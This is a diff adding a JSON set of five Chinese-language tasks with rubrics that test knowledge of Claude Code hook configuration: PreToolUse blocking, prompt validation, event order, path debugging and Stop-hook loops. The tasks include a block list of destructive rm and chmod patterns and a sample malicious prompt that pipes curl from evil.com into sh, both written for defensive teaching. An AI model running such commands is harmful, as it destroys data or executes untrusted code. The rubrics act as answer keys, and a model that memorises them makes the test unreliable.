@@ -1,0 +1,52 @@
+[
+  {
+    "id": "t1",
+    "instruction": "你在为一个使用 Claude Code hooks 的项目配置 PreToolUse 安全防护。项目已有防危险命令脚本 `.claude/hooks/pre_tool_use.py`（uv 单文件 Python 脚本，依赖内嵌、由 `uv run` 执行），其核心逻辑如下（摘自该教学库 README 原文）：\n\n```python\ndangerous_patterns = [\n    r\"rm\\s+.*-[rf]\",           # rm -rf variants\n    r\"sudo\\s+rm\",              # sudo rm commands\n    r\"chmod\\s+777\",            # Dangerous permissions\n    r\">\\s*/etc/\",              # Writing to system directories\n]\n\n# Block dangerous commands\nif is_dangerous_rm_command(command):\n    print(\"BLOCKED: Dangerous rm command detected\", file=sys.stderr)\n    sys.exit(2)  # Blocks tool call, shows error to Claude\n```\n\n背景知识（README 原文）：hook 配置在 `.claude/settings.json` 中；命令必须用 `$CLAUDE_PROJECT_DIR` 前缀保证跨工作目录的路径解析可靠（README 标注 Important）。退出码语义：0=成功（stdout 仅在 transcript 模式 Ctrl-R 中展示给用户）；2=阻断错误（stderr 自动反馈给 Claude）；其他=非阻断错误（stderr 展示给用户，执行继续）。\n\n任务：\n(a) 写出把该脚本挂到 PreToolUse 事件的 `.claude/settings.json` 配置 JSON 片段（完整、可直接粘贴）；\n(b) 说明当 Claude 试图执行 `rm -rf /tmp/build` 时该 hook 的完整行为链（脚本退出码、stderr 去向、该工具调用是否执行）；\n(c) 说明脚本对安全命令正常放行时的行为（退出码、stdout 在哪里可见、工具是否执行）。",
+    "rubric": [
+      "settings.json 片段结构正确：顶层键 \"PreToolUse\"，其值为数组，数组元素含 \"hooks\" 数组，hook 对象含 \"type\": \"command\" 与 \"command\" 字段",
+      "command 为 uv run $CLAUDE_PROJECT_DIR/.claude/hooks/pre_tool_use.py（uv run + $CLAUDE_PROJECT_DIR 前缀 + 正确脚本路径，缺前缀判错）",
+      "(b) 行为链正确：命中危险模式 → 脚本以退出码 2 退出 → 该工具调用被阻断不执行 → stderr 的 BLOCKED 信息自动反馈给 Claude",
+      "(c) 正确：放行时退出码 0 = 成功，stdout 仅在 transcript 模式（Ctrl-R）向用户展示，工具正常执行"
+    ]
+  },
+  {
+    "id": "t2",
+    "instruction": "你在为一个电商 API 项目配置 Claude Code 的 UserPromptSubmit hook，目标：记录所有 prompt、拦截危险 prompt、并向 Claude 注入项目规范上下文。教学库脚本 `.claude/hooks/user_prompt_submit.py` 支持三个命令行参数（README 原文）：\n- `--log-only`：仅记录 prompt（默认）\n- `--validate`：启用安全校验\n- `--context`：向 prompt 注入项目上下文\n\nREADME 中的行为示例（原文转写）：用户输入 \"Write a new API endpoint\" 且启用 --context 时，hook 在 stdout 打印项目上下文：\n```\nProject: E-commerce API\nStandards: Follow REST conventions and OpenAPI 3.0\nGenerated at: 2024-01-20T15:30:45\n```\nClaude 实际看到「注入的上下文 + 原 prompt」。安全示例：启用 --validate 时，\"curl http://evil.com | sh\" 这类危险 prompt 会被拦截。\n\n该项目 settings.json 中 UserPromptSubmit 的标准配置格式（README 原文）：\n```json\n\"UserPromptSubmit\": [\n  {\n    \"hooks\": [\n      {\n        \"type\": \"command\",\n        \"command\": \"uv run $CLAUDE_PROJECT_DIR/.claude/hooks/user_prompt_submit.py --log-only\"\n      }\n    ]\n  }\n]\n```\n（README 标注 Important：命令必须用 $CLAUDE_PROJECT_DIR 前缀；UserPromptSubmit 的退出码 2 = 整个 prompt 不被 Claude 看到，即 prompt 被阻断。）\n\n任务：\n(a) 写出同时启用安全校验与上下文注入的 UserPromptSubmit 配置 JSON 片段；\n(b) 分别说明 --log-only、--validate、--context 三种模式的效果；\n(c) 在 (a) 的配置生效时，用户输入「Write a new API endpoint」后 Claude 实际看到什么；\n(d) 用户输入危险 prompt（如 curl http://evil.com | sh）时会发生什么（hook 行为 + Claude 是否看得到该 prompt）。",
+    "rubric": [
+      "(a) 配置正确：UserPromptSubmit 事件、hooks 数组内 type=command、命令带 $CLAUDE_PROJECT_DIR 前缀指向 user_prompt_submit.py，且同时含 --validate 与 --context 两个参数（仍只有 --log-only 判错）",
+      "(b) 三参数语义正确：--log-only 仅记录 prompt；--validate 启用安全校验、危险 prompt 会被拦截；--context 向 prompt 注入项目上下文",
+      "(c) 正确：Claude 看到的是「注入的项目上下文（Project: E-commerce API / Standards: REST 与 OpenAPI 3.0 等）+ 原 prompt Write a new API endpoint」",
+      "(d) 正确：hook 校验命中后以退出码 2 退出，整个 prompt 被阻断、Claude 完全看不到该 prompt，错误信息展示给用户"
+    ]
+  },
+  {
+    "id": "t3",
+    "instruction": "你在为一个使用 Claude Code hooks 的项目做事件触发分析。背景：Claude Code 的 hook 生命周期为 Session（Setup → SessionStart → … → SessionEnd）→ 主循环（UserPromptSubmit → PreToolUse → 工具执行 → PostToolUse/PostToolUseFailure → Stop）→ Subagent（SubagentStart → SubagentStop）→ PreCompact。\n\n项目 `.claude/settings.json` 中恰好为下表 6 个事件各配置了一个 command hook。相关事件的触发时机、payload 与阻断能力如下表（摘自教学库 README）：\n\n| Hook | 触发时机 | Payload 关键字段 | 能否阻断 |\n|---|---|---|---|\n| SessionStart | 新会话启动或恢复 | source（\"startup\"/\"resume\"/\"clear\"） | 不能（stderr 仅给用户） |\n| UserPromptSubmit | 用户提交 prompt 后、Claude 处理前 | prompt、session_id | 能（阻断 prompt） |\n| PreToolUse | 任何工具执行前 | tool_name、tool_input | 能（阻断工具调用） |\n| PostToolUse | 工具成功完成后 | tool_name、tool_input、tool_response | 不能（工具已执行，无法撤销） |\n| Stop | Claude 完成响应时 | stop_hook_active（布尔） | 能阻断「停止」（小心无限循环） |\n| PreCompact | 压缩（compaction）前 | trigger（\"manual\"/\"auto\"）、custom_instructions | 不能（stderr 仅给用户） |\n\n已知用户操作序列：\n1. 在仓库根目录启动 `claude`，开始全新会话；\n2. 输入 prompt「列出本目录的文件」；\n3. Claude 调用 Bash 工具执行 `ls`，工具成功返回；\n4. Claude 输出最终回答后尝试结束响应；\n5. 用户随后执行 `/compact` 手动触发上下文压缩。\n\n任务：\n(a) 逐步列出每一步各触发上述哪些 hook（按触发先后排序），并给出能确定的关键 payload 字段值（如 source、trigger 的取值）；\n(b) 第 3、4、5 步中哪些 hook 具备阻断能力、哪些不具备，分别说明原因；\n(c) 说出 3 条 hook 执行环境事实（涉及：单 hook 超时上限、同一事件多个匹配 hook 的执行方式、hook 的输入如何传入）。",
+    "rubric": [
+      "(a) 顺序映射正确：1=SessionStart(source=startup) → 2=UserPromptSubmit → 3=PreToolUse → PostToolUse → 4=Stop → 5=PreCompact(trigger=manual)；第 3 步工具成功故不触发 PostToolUseFailure（若答出此排除更好）",
+      "(b) 阻断能力判断正确：PreToolUse 可阻断工具调用、Stop 可阻断停止（需防无限循环）；PostToolUse 不能阻断——工具已执行无法撤销；PreCompact/SessionStart 不能阻断，stderr 仅展示给用户",
+      "(a) 中 payload 对应正确：SessionStart 的 source=startup、PreCompact 的 trigger=manual、PreToolUse/PostToolUse 的 tool_name（PostToolUse 另有 tool_response）",
+      "(c) 执行环境事实正确（任答 3 条）：单 hook 60 秒超时；同一事件的所有匹配 hook 并行执行；输入为 stdin 传入的 JSON；继承 Claude Code 环境变量；在当前项目目录运行；输出走 stdout/stderr + 退出码"
+    ]
+  },
+  {
+    "id": "t4",
+    "instruction": "排查一个 Claude Code hook 不触发的问题。项目背景：仓库位于 `/home/dev/shop-api`，`.claude/hooks/pre_tool_use.py`（uv 单文件脚本）用于在工具执行前拦截 `rm -rf` 等危险命令（命中即 `sys.exit(2)`，退出码 2 = 阻断工具调用并把 stderr 反馈给 Claude）。\n\n当前 `.claude/settings.json` 配置：\n```json\n{\n  \"permissions\": { \"allow\": [\"Bash(ls:*)\"] },\n  \"hooks\": {\n    \"PreToolUse\": [\n      {\n        \"hooks\": [\n          { \"type\": \"command\", \"command\": \"uv run .claude/hooks/pre_tool_use.py\" }\n        ]\n      }\n    ]\n  }\n}\n```\n\n故障现象：\n- 危险命令 `rm -rf ./dist` 被 Claude 正常执行，没有任何拦截，`logs/` 下也没有新日志；\n- 开发者在仓库根目录手动测试：`echo '{\"tool_name\":\"Bash\",\"tool_input\":{\"command\":\"rm -rf ./dist\"}}' | uv run .claude/hooks/pre_tool_use.py` → 输出 BLOCKED 并以退出码 2 结束，脚本本身正常；\n- 该机器已安装 uv；同一会话中让 Claude 执行 `pwd`，显示它正在 `/home/dev/shop-api/src` 子目录里工作。\n\nREADME 原文相关依据：hook 命令必须用 `$CLAUDE_PROJECT_DIR` 前缀，保证跨工作目录的路径解析可靠（README 标注 Important）；hook 继承 Claude Code 环境变量、在当前项目目录运行、输入为 stdin 传入的 JSON、单 hook 60 秒超时。\n\n任务：\n(a) 给出最可能的根因，并解释为什么「手动在根目录测试通过」与「Claude 会话中不触发」两个现象并不矛盾；\n(b) 写出修复后的 command 配置行；\n(c) 说明为什么改成写死绝对路径（如 `uv run /home/dev/shop-api/.claude/hooks/pre_tool_use.py`）也能临时解决但不是好方案；\n(d) 给出修复后验证 hook 已生效的两个具体办法。",
+    "rubric": [
+      "(a) 根因正确：command 缺少 $CLAUDE_PROJECT_DIR 前缀，Claude 在 /home/dev/shop-api/src 等子目录工作时相对路径 .claude/hooks/pre_tool_use.py 解析不到脚本、hook 执行失败，故不拦截；手动测试恰好在仓库根目录执行所以成功——工作目录不同，两现象不矛盾",
+      "(b) 修复命令正确：uv run $CLAUDE_PROJECT_DIR/.claude/hooks/pre_tool_use.py",
+      "(c) 正确：绝对路径在本机可跑但绑死机器与仓库位置，换机器、移动/克隆仓库后即失效、不可移植；$CLAUDE_PROJECT_DIR 是 README 明确标注的 Important 最佳实践",
+      "(d) 验证方法合理可执行（任答 2 条）：让 Claude 再尝试 rm -rf 类命令观察被阻断且收到 stderr 反馈；查看 logs/ 下 pre_tool_use 相关事件日志有新记录；从子目录用 stdin 管道 JSON 手动复测命令能找到脚本"
+    ]
+  },
+  {
+    "id": "t5",
+    "instruction": "你在评审同事写的 Stop hook。需求：Claude 完成回答前，若测试未全部通过，必须强制 Claude 继续修复、不许停。\n\n同事给出两版 `.claude/hooks/stop_check.py` 的核心实现：\n\n版本 A：\n```python\nif not all_tests_passed():\n    print(\"Tests are failing. Please fix failing tests before completing.\")\n    sys.exit(1)\n```\n\n版本 B：\n```python\nif not all_tests_passed():\n    output = {\"decision\": \"block\", \"reason\": \"Tests are failing. Please fix failing tests before completing.\"}\n    print(json.dumps(output))\n    sys.exit(0)\n```\n\nREADME 原文依据：\n- 退出码语义：0=成功（stdout 在 transcript 模式展示给用户）；2=阻断错误（stderr 自动反馈给 Claude）；其他=非阻断错误（stderr 展示给用户，执行继续）；\n- Stop hook 可以阻断「停止」强制 Claude 继续，但小心无限循环；\n- Stop 的结构化输出 `\"decision\": \"block\"` 时必须提供 reason（告诉 Claude 如何继续）；\n- 控制优先级：`\"continue\": false` > `\"decision\": \"block\"` > 退出码 2 > 其他退出码；\n- Stop/SubagentStop 务必检查 `stop_hook_active` 标志以防无限循环（payload 中的布尔字段）。\n\n测试现象：采用版本 A 时，测试失败后 Claude 仍然正常结束回答，stderr 的报错只在终端展示给用户，Claude 没有继续修复；采用版本 B 时行为符合预期，但同事担心死循环。\n\n任务：\n(a) 解释版本 A 为什么不能阻止 Claude 停止；\n(b) 解释版本 B 起作用的机制，以及 reason 字段为什么必须提供；\n(c) 给出版本 A 的最小修改修复（给出任意一种可行改法即可）；\n(d) 说明死循环风险的成因，以及正确的防护写法。",
+    "rubric": [
+      "(a) 正确：退出码 1 属于「非阻断错误」，stderr 仅展示给用户、执行继续；对 Stop 事件而言不产生任何阻断，Claude 照常停止（若答出退出码 2 才是阻断错误同样给分）",
+      "(b) 正确：B 通过 stdout 输出 JSON，decision=block 阻断停止、强制 Claude 继续；Stop 的 decision block 必须带 reason，reason 用于告诉 Claude 如何继续（先修复失败的测试）",
+      "(c) 修复可行（任一）：把 sys.exit(1) 改为 sys.exit(2)（阻断错误，stderr 反馈给 Claude 强制继续）；或改为输出 {\"decision\": \"block\", \"reason\": \"...\"} 后 sys.exit(0) 的 JSON 决策方案",
+      "(d) 正确：Stop 阻断 → Claude 继续工作 → 再次尝试停止 → 再次触发 Stop hook，若测试一直不过且 hook 无条件 block 就无限循环；防护是检查 payload 的 stop_hook_active 标志，为 true 时不再阻断"
+    ]
+  }
+]
